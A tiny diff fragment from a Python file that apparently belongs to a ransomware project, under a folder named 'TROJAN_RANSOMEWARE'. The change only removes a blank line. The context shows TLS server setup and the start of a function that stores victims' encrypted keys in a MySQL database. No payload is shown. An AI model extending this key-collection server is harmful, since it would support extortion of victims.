@@ -22,7 +22,6 @@ key_pem = "D:\\python_programmers_clab\\TROJAN_RANSOMEWARE\\key.pem"
 context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 context.load_cert_chain(certfile=cert_pem,keyfile=key_pem)
 
-
 def save_encrypted_key_to_db(encrypted_key_b64):
     conn = mysql.connector.connect(
         host="localhost",
